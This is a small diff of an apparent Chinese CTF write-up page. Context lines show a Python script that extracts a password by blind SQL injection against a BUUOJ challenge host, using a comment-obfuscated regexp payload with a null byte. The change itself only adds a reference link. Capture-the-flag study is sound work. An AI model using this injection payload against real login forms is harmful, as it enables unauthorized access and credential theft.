@@ -226,6 +226,7 @@
 <p>import requests<br>import string<br>url = “<a target="_blank" rel="noopener" href="http://5f80822e-bbf0-4050-ba1b-6fc9c1783ad4.node3.buuoj.cn/&quot;">http://5f80822e-bbf0-4050-ba1b-6fc9c1783ad4.node3.buuoj.cn/&quot;</a><br>str_list = string.ascii_lowercase + string.ascii_uppercase + string.digits + “_”</p>
 <p>password= “”<br>while(True):<br>    for j in str_list :<br>        data = {<br>            “username” : “\“,<br>            “passwd” : ‘||/<em>1</em>/passwd/<em>2</em>/regexp/<em>3</em>/“^%s”;%s’ % (password+j,chr(0))<br>        }<br>        r = requests.post(url,data=data)<br>        if(“welcome” in r.text):<br>            password += j<br>            print(password)<br>            break</p>
 <p>```<br>最后得到密码并直接提交即可得到flag</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/106088835]">https://zhuanlan.zhihu.com/p/106088835]</a></p>
 
       
     </div>
